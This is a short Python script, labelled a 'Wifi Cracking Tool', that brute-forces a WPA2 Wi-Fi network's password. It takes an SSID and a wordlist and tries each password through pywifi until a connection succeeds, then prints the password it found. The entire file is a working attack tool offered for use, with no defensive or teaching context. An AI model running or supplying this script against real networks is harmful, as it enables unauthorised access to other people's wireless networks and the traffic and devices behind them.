try:
    import argparse
    import sys , os , os.path , platform
    import time
    
    from pywifi import PyWiFi
    from pywifi import const
    from pywifi import Profile

except ImportError:
    print("[!] libraries not importing")

try:
    wifi = PyWiFi()
    iface = wifi.interfaces()[0]

    iface.scan()
    results = iface.scan_results()

   
except:
    print('[!] Error system')
    sys.exit(1)


def pwd(ssid,file_path):
    count = 0
    with open (file_path, 'r', encoding='utf8') as words:
        for line in words:
            count +=1
            line = line.split('\n')
            password = line[0]
            main(ssid, password,count)

def main(ssid, password,count):

    profile = Profile()
    profile.ssid=ssid
    profile.auth = const.AUTH_ALG_OPEN
    profile.akm.append(const.AKM_TYPE_WPA2PSK)
    profile.cipher = const.CIPHER_TYPE_CCMP

    profile.key = password
    iface.remove_all_network_profiles()
    connect = iface.add_network_profile(profile)
    time.sleep(0.1)
    iface.connect(connect)
    time.sleep(0.5)

    if iface.status() == const.IFACE_CONNECTED:
        time.sleep(1)
        print('[*]Crack Success!')
        print("[***] Password is " +password)
        time.sleep(1)
        exit()
    else:
        print(f'[{count}]Crack Failed using {password}')

            
if __name__=='__main__':
    parser = argparse.ArgumentParser(description="Wifi Cracking Tool")

    parser.add_argument('-s', '--ssid', help='Wifi Name', dest='ssid', default=False )
    parser.add_argument('-w', '--wordlist', help='Password list', dest='wordlist', default=False)
    args = parser.parse_args()

    if args.wordlist and args.ssid:
        ssid=args.ssid
        file_path=args.wordlist
    elif len(sys.argv) == 1:
        parser.print_help()
        sys.exit(1)
    elif not args.ssid:
        parser.error('Wrong ssid')
        sys.exit(1)
    elif not args.wordlist:
        parser.error('Wrong Wordlist')
    
    print("Cracking...")
    if os.path.exists(file_path):
        if platform.system().startswith('Win' or 'win'):
            os.system('cls')
        else:
            os.system('clear')
        print('[***] Cracking...')
        pwd(ssid,file_path)
